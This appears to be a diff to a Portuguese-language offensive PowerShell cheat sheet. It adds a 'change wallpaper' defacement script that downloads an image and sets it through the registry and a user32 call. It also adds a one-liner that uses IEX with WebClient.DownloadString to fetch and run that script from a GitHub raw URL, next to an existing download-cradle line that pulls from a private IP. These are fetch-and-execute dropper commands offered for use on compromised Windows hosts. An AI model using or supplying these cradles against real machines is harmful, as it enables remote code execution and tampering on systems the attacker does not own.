@@ -176,6 +176,38 @@ Windows
 ```
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/smith')
 ```
+### Trocar papel de parede
+```
+nano hacked
+```
+```
+#Script de modificação de Wallpaper
+
+# Baixa o wallpaper e salva em "C:\Windows\Tasks\"
+iwr -uri https://raw.githubusercontent.com/thiagosmith/desk/refs/heads/main/wallpaper.png -o C:\Windows\Tasks\wallpaper.png
+
+# Defina o caminho da imagem que será usada como papel de parede
+$wallpaper = "C:\Windows\Tasks\wallpaper.png"
+
+# Atualiza o registro do Windows com o novo papel de parede
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value $wallpaper
+
+# Força o Windows a aplicar o novo papel de parede
+Add-Type -TypeDefinition @"
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+
+# Chama a função nativa do Windows
+[Wallpaper]::SystemParametersInfo(20, 0, $wallpaper, 3)
+```
+```
+powershell IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/thiagosmith/desk/refs/heads/main/hacked')
+```
+
 ### PowerShell Dropper OneLine com IEX
 Kali Linux
 ```
